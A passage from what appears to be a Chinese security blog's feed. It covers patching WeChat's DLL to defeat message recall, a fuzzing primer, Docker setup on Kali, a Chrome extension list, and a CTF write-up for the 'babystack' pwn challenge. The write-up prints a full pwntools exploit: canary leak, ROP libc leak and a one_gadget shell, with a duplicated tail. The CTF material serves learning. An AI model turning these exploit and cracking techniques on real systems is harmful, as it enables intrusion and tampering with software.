title="过程总结"></a>过程总结</h3>微信消息的撤回破解，重点还是在WechatWin.dll文件中，需要通过逆向找到dll文件中执行相关命令的函数，并nop掉（和上述QQ消息防撤回大同小异，一个是jmp跳转，一个是nop）。直接nop的手法还是显得有些粗糙。在查找资料的过程中，看到有些大佬是使用hook技术实现的消息防撤回机制，大感羡慕…在以后的学习过程中，想学习一些hook技术，在微信消息撤回时触发hook机制，以一个对话框的形式展示撤回内容。</li></ol></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> crack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Wechat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘 | 简单高效的模糊测试Fuzzing</title>
      <link href="/2020/03/31/fuzzing/"/>
      <url>/2020/03/31/fuzzing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘要：Fuzzing是一种通过构造输入来发现软件中的漏洞的一个简单高效的模糊测试方法。</p></blockquote><blockquote><p>前言：打CTF的时候就听说过几次fuzzing方法，大概知道是一种检测漏洞的方法，一直没了解过，今天抽个时间学习了一下。</p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>Fuzzing方法是指通过构造测试输入，对软件进行大量测试来发现软件中的漏洞的一种模糊测试方式。在现实的漏洞挖掘中，fuzzing因其简单高效的优势，成为非常主流的漏洞挖掘方法。</p><blockquote><p>模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。<br>——来自Wikipedia</p></blockquote><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>模糊测试通常被用于<strong>黑盒测试</strong>。其回报率通常比较高。当然，模糊测试只是相当于对系统的行为做了一个随机采样，所以在许多情况下通过了模糊测试只是说明软件可以处理异常以避免崩溃，而不能说明该软件的行为完全正确。这表明模糊测试更多是一种对整体质量的保证，并不能替代全面的测试或者形式化方法。作为一种粗略的可靠性度量方法，模糊测试可以提示程序哪些部件需要特殊的注意。对于这些部件可以进一步使用代码审计，静态分析以及代码重写。</p><h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><p>模糊测试工具通常可以被分为两类。<strong>变异测试</strong>通过改变已有的数据样本去生成测试数据。<strong>生成测试</strong>则通过对程序输入的建模来生成新的测试数据。</p><p>最简单的模糊测试是通过命令行，网络包或者事件向一个程序输入一段随机比特流。这种技术当前依然是有效的发现程序错误的方法。另一个常见且易于实现的技术是通过随机反转一些比特或者整体移动一些数据块来变异已有的输入数据。但是，最有效的模糊测试需要能够理解被测试对象的格式或者协议。这可以通过阅读设计规格来实现。基于设计规格的模糊工具包含完整的规格，并通过基于模型的测试生成方法去遍历规格，并在数据内容，结构，消息，序列中引入一些异常。这种“聪明的”模糊测试也被称作<strong>健壮性测试，句法测试，语法测试以及错误注入</strong>。这种协议感知的特性也可以启发式的从例子中生成。相关的工具有Sequitur。</p><p>模糊测试也可以与其他技术结合。白盒模糊测试结合了符号执行技术与约束求解技术。演化模糊测试则利用了一个启发的反馈来有效的实现自动的探索性测试。</p><h2 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h2><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="https://img-blog.csdnimg.cn/20200331225732678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Fuzzing基本流程"></p><h3 id="1-大量的测试用例"><a href="#1-大量的测试用例" class="headerlink" title="1.大量的测试用例"></a>1.大量的测试用例</h3><p>进行模糊测试的首要条件就是需要大量的测试用例（即种子输入），例如Charlie Miller对Reader 9.2.0进行的fuzzing测试，他首先从网上的1515个文件变异得到3036000个测试用例进行测试，最后得到crash。在对Preview这个软件做测试时，用了大概2790000个测试用例进行测试才得以拿到crash。这些数字跟我们的直观感受就是我们需要获得大量的测试用例，才能保证模糊测试过程中拿到程序的crash。</p><h3 id="2-对测试用例做过滤"><a href="#2-对测试用例做过滤" class="headerlink" title="2.对测试用例做过滤"></a>2.对测试用例做过滤</h3><p>实际情况中，并不是说拿很多的测试用例就可以去测试软件就可以拿到漏洞，即fuzzing测试并不是简单的关于生成测试用例去做测试的故事，而是一个关于怎么对测试用例做过滤的故事。并不是说得到几十万量级的测试用例之后，就可以拿到漏洞了，而实际上，这几十万个测试用例都是精品，用这些精品进行测试才得以发现的漏洞，那么怎么把这些精品过滤出来，这才是关键，也是我们在进行fuzzing测试过程中需要做的第二件重要的准备工作。</p><p>比如Charlie Miller在测试PDF的时候，他把网上所有能够下载到的80000个PDF文档都下载下来，然后找到一个最小的子集，这个子集的代码覆盖率和全集的代码覆盖率是一样的，这个最小的子集也就是软件测试中的最初始的集合—1515个文件，在这个最初始的集合上再去做fuzz，这就是一个筛选的过程，我们可以用代码覆盖率作为衡量标准，当然也可以选择其他合适的标准来完成这一筛选过程。</p><h3 id="3-要用正确的方法"><a href="#3-要用正确的方法" class="headerlink" title="3.要用正确的方法"></a>3.要用正确的方法</h3><p>Laurent Gaffié说过，他在研究SMB协议的远程调用接口的时候，最先做了很多工作，结果都失败了，直到他将策略改变成了用单字节的网络数据包，才有了大量的产量。所以fuzzing是要讲方法的，要想清楚可能出问题的是什么地方，你要用什么样的方法去把这个东西找出来，关于方法，每年都有很多的论文，大家可以去看。</p><p>Charlie Miller也说，很多关于fuzzing的报告都是讲述如何成功，但是现实中的fuzzing大部分都是讲关于失败的。可见在现实中做fuzz测试的时候，你会遇到很多挫折。所以找到正确的方法非常重要！CharlieMiller和Laurent Gaffié给出的代码虽然看起来很不起眼，但一旦找到了正确的方法，得到的结果往往很令人惊喜。</p><h3 id="4-花90-时间阅读文档"><a href="#4-花90-时间阅读文档" class="headerlink" title="4.花90%时间阅读文档"></a>4.花90%时间阅读文档</h3><p>还有一个问题，就是做fuzzing的人，并不是简单的写几行代码，对着软件一通测试就会出来结果。在做fuzzing之前，会有很多的时间是花在阅读文档上的。</p><p>对于复杂的程序，我们要去分析这个程序的功能是什么，它可能出问题的地方在什么位置，会有大量的几乎90%的时间是花在这上面的，这是Charlie Miller和Laurent Gaffié的一个评估。</p><h3 id="5-Fuzzing工具"><a href="#5-Fuzzing工具" class="headerlink" title="5.Fuzzing工具"></a>5.Fuzzing工具</h3><p>AFL，它是目前最受欢迎的一个工具，是一个导向型的fuzzing工具。 Fuzzing通常由盲fuzzing（blind fuzzing）和导向性fuzzing（guided fuzzing）两种。blind fuzzing生成测试数据的时候不考虑数据的质量，通过大量测试数据来概率性地触发漏洞。Guided fuzzing则关注测试数据的质量，期望生成更有效的测试数据来触发漏洞的概率。比如，通过测试覆盖率来衡量测试输入的质量，希望生成有更高测试覆盖率的数据，从而提升触发漏洞的概率。</p><p>AFL这个工具出来的一个起因就是AFL的开发者认为盲fuzzing的效率是比较低的；第二个原因就是Charlie Miller和Laurent Gaffié所做的样本筛选的方法是有效果的；还有第三个原因就是符号执行，符号执行在理论是非常不错的，但在实际中经常受到可行性、性能等方面的限制。于是在这样一个背景下，AFL出现了。</p><p>AFL有两个关键词：指令插桩和边覆盖。首先AFL是基于插桩的，能够辅助程序分析；其次AFL是基于边覆盖的，是对Charlie Miller等人基于块覆盖用样本筛选的一个改进和提升。<br>参考：<br><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95" target="_blank" rel="noopener">1.模糊测试-维基百科</a><br><a href="https://www.freebuf.com/news/193602.html" target="_blank" rel="noopener">2.简单高效的模糊测试Fuzzing</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali linux下docker与docker-compose的安装及两者差异</title>
      <link href="/2020/03/27/kali-docker/"/>
      <url>/2020/03/27/kali-docker/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近接了一个漏洞环境搭建的活，需要用到docker和docker-compose。因为物理机是Win10的，安装docker需要开启Hyper-V，但是Hyper-V和Vmware冲突。所以就在kali虚拟机里面搭了docker。下面记录一下搭建过程。</p><h2 id="安装docker："><a href="#安装docker：" class="headerlink" title="安装docker："></a>安装docker：</h2><pre><code>step1.apt-get updateapt-get install -y apt-transport-https ca-certificatesapt-get install dirmngrstep2.apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Dstep3.echo 'deb https://apt.dockerproject.org/repo debian-stretch main' &gt; /etc/apt/sources.list.d/docker.liststep4.apt-get updatess-local -c /etc/shadowsocks.json (起飞机)proxychains4 apt-get install docker-engine 代理下载</code></pre><p><img src="https://img-blog.csdnimg.cn/20200327005202102.jpg" alt="docker 搭建成功"></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><pre><code>ss-local -c /etc/shadowsocks.jsonproxychains4 curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</code></pre><h2 id="docker和docker-compose的对比"><a href="#docker和docker-compose的对比" class="headerlink" title="docker和docker-compose的对比"></a>docker和docker-compose的对比</h2><p><strong>介绍</strong></p><blockquote><p>docker是一个供开发和运维人员开发，测试，部署和运行应用的容器平台。<br>compose是一个用于运行和管理多个容器化应用的工具。</p></blockquote><p><strong>对比</strong></p><ul><li>docker是自动化构建镜像，并启动镜像。 docker compose是自动化编排容器。</li><li>docker是基于Dockerfile得到images,启动的时候是一个单独的container</li><li>docker-compose是基于docker-compose.yml,通常启动的时候是一个服务，这个服务通常由多个container共同组成，并且端口，配置等由docker-compose定义好。</li><li>两者都需要安装，但是要使用docker-compose，必须已经安装docker</li></ul><p>参考博客：<br><a href="https://blog.51cto.com/11834557/2309885" target="_blank" rel="noopener">Linux下docker安装</a><br><a href="https://blog.csdn.net/hero_hope/article/details/91168836" target="_blank" rel="noopener">Linux下docker-compose安装</a><br><a href="https://www.jianshu.com/p/5794ec7e603b" target="_blank" rel="noopener">docker与docker-compose介绍，对比与使用</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>one_gadget用法|攻防世界pwn进阶区babystack</title>
      <link href="/2020/03/25/babystack/"/>
      <url>/2020/03/25/babystack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-检查保护"><a href="#0x00-检查保护" class="headerlink" title="0x00.检查保护"></a>0x00.检查保护</h2><pre><code>devil@ubuntu:~/adworld/pwn$ checksec babystack[*] '/home/devil/adworld/pwn/babystack'    Arch:     amd64-64-little    RELRO:    Full RELRO ;无法修改got表    Stack:    Canary found ;不能直接进行溢出    NX:       NX enabled ;堆栈不可执行    PIE:      No PIE (0x400000)</code></pre><h2 id="0x01-one-gadget"><a href="#0x01-one-gadget" class="headerlink" title="0x01.one_gadget"></a>0x01.one_gadget</h2><p>本题给了libc版本，可以使用<strong>one_gadget</strong>工具<br>我也是第一次使用one_gadget，简单介绍一下：</p><blockquote><p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so<br><a href="https://github.com/david942j/one_gadget">官方文档点击此处</a></p></blockquote><pre><code>devil@ubuntu:~/adworld/pwn$ one_gadget libc-2.23.so0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf0274 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1117 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</code></pre><p>通过使用one_gadget可以找到获得shell的函数的地址</p><pre class="line-numbers language-yaml"><code class="language-yaml">execve_addr = 0x45216<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x02-ida调试"><a href="#0x02-ida调试" class="headerlink" title="0x02.ida调试"></a>0x02.ida调试</h2><p><img src="https://img-blog.csdnimg.cn/20200325005840582.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="ida调试确定输入和canary距离"><br>可以看出v6储存的是canary，s是我们输入的字符串，二者相距0x88字节。<br>则我们先输入0x88个字节，再利用print函数就可以把canary的值带出来。<br><strong>代码如下：</strong></p><pre class="line-numbers language-python"><code class="language-python">payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了canary的值我们可以进行溢出，64位程序溢出还需要一个<code>pop rdi;ret</code><br><img src="https://img-blog.csdnimg.cn/20200325005956650.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="ROPgadget"></p><pre><code>0x0000000000400a93 : pop rdi ; ret</code></pre><h2 id="0x03-解题思路："><a href="#0x03-解题思路：" class="headerlink" title="0x03.解题思路："></a>0x03.解题思路：</h2><p>用’a’<em>0x88字节带出canary，知道canary即可进行溢出。<br>溢出利用puts函数输出puts的函数地址，再利用<code>puts_addr-libc.symbols['puts']</code>得到libc偏移offset<br><em>*execve_addr=offset+one_gadget得到的execve代码</em></em></p><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04.exp"></a>0x04.exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">51596</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>execve <span class="token operator">=</span> <span class="token number">0x45216</span> <span class="token comment" spellcheck="true">#one_gadget得到</span>main_addr <span class="token operator">=</span> <span class="token number">0x400908</span> <span class="token comment" spellcheck="true">#main函数地址</span>rdi_addr <span class="token operator">=</span> <span class="token number">0x400a93</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token comment" spellcheck="true">#s和canary距离</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要使用sendline，即输入'A'*0x88后还要有一个回车，目的是将canary尾部的'\x00'覆盖为'\x0A'</span><span class="token comment" spellcheck="true">#用puts函数输出canary时，puts函数遇到'\x00'会截断，使用'\x0A'覆盖'\x00'，才能将canary输出</span><span class="token comment" spellcheck="true">#注意，本程序是小端字节序（低位地址对应高位字节）</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#要等到'\n'之后再读取</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#r.recv(7)是由于puts输出的canary最后一位是'\x0A',要重新换成'\x00'</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用puts函数将puts函数的地址输出</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>execve_addr <span class="token operator">=</span> offset <span class="token operator">+</span> execvepayload3 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用Chrome插件功能介绍系列&amp;&amp;安装指南</title>
      <link href="/2020/03/22/chrome/"/>
      <url>/2020/03/22/chrome/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Infinity-New-Tab"><a href="#0x00-Infinity-New-Tab" class="headerlink" title="0x00.Infinity New Tab"></a>0x00.Infinity New Tab</h2><p><img src="https://img-blog.csdnimg.cn/20200322004344837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Infinity New Tab"><br><img src="https://img-blog.csdnimg.cn/20200322005431651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="安装之后的界面"></p><blockquote><p>介绍：这是一款美化标签页的工具，功能强大，支持添加标签页网址图标。<br>推荐级别：3星级<br><a href="https://chrome.google.com/webstore/detail/infinity-new-tab-producti/dbfmnekepjoapopniengjbcpnbljalfg/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x01-集装箱"><a href="#0x01-集装箱" class="headerlink" title="0x01.集装箱"></a>0x01.集装箱</h2><p><img src="https://img-blog.csdnimg.cn/20200322010719582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="google助手"><br><img src="https://img-blog.csdnimg.cn/20200322010822852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="右键增强"></p><blockquote><p>介绍：集装箱插件是google助手、网盘助手、优惠购、增益功能等插件的合集。尤其要推荐一下右键增强功能，选择文本、右键选择集装箱，会出现很多功能，比如使用各种搜索引擎进行搜索，而且还能生成当前界面二维码，google助手功能也十分强大！<br>推荐级别：5星级<br><a href="https://chrome.google.com/webstore/detail/%E9%9B%86%E8%A3%85%E7%AE%B1/kbgigmcnifmaklccibmlepmahpfdhjch/related?hl=zh-CN" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x02-OneTab-Plus"><a href="#0x02-OneTab-Plus" class="headerlink" title="0x02.OneTab Plus"></a>0x02.OneTab Plus</h2><p><img src="https://img-blog.csdnimg.cn/2020032201213940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="整合标签页"></p><blockquote><p>介绍：OneTab Plus可以把多个标签页整合成一个列表形式的标签页，这个功能对我来说真的很好用，因为平时打比赛可能同时打开好几十个标签页…<br>推荐级别：4星级<br><a href="https://chrome.google.com/webstore/detail/onetab-plustab-manage-pro/lepdjbhbkpfenckechpdfohdmkhogojf/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x03-Adblock-Plus"><a href="#0x03-Adblock-Plus" class="headerlink" title="0x03.Adblock Plus"></a>0x03.Adblock Plus</h2><p><img src="https://img-blog.csdnimg.cn/20200322012942878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Adblock Plus功能"></p><blockquote><p>介绍：Chrome支持的广告屏蔽插件，可以屏蔽绝大多数网站广告，可以自行设置网站白名单，并不会降低网页打开速度。<br>推荐级别：3颗星<br><a href="https://chrome.google.com/webstore/detail/adblock-plus-free-ad-bloc/cfhdojbkjhnklbpkdaibdccddilifddb/related" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h2 id="0x04-Tampermonkey"><a href="#0x04-Tampermonkey" class="headerlink" title="0x04.Tampermonkey"></a>0x04.Tampermonkey</h2><p><img src="https://img-blog.csdnimg.cn/20200322015254707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Tampermonkey"></p><blockquote><p>介绍：Tampermonkey，国内称作“油猴”，是一个管理浏览器脚本的插件。它能安装众多实用的浏览器脚本。<br>推荐级别：4颗半星<br><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><p><strong>油猴脚本：</strong></p><h3 id="1-Ac-baidu"><a href="#1-Ac-baidu" class="headerlink" title="1.Ac-baidu"></a>1.Ac-baidu</h3><p><img src="https://img-blog.csdnimg.cn/20200322015534813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Ac-baidu安装后界面"></p><blockquote><p>介绍：Ac-baidu是一款重定向优化搜索引擎的脚本，能大幅度提高搜索速度，优化显示界面。<br>推荐级别：3星级<br><a href="https://greasyfork.org/zh-CN/scripts/14178-ac-baidu-%E9%87%8D%E5%AE%9A%E5%90%91%E4%BC%98%E5%8C%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%8B%97%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2-%E5%8E%BB%E5%B9%BF%E5%91%8A-favicon-%E5%8F%8C%E5%88%97" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><h3 id="2-哔哩哔哩播放器调整R"><a href="#2-哔哩哔哩播放器调整R" class="headerlink" 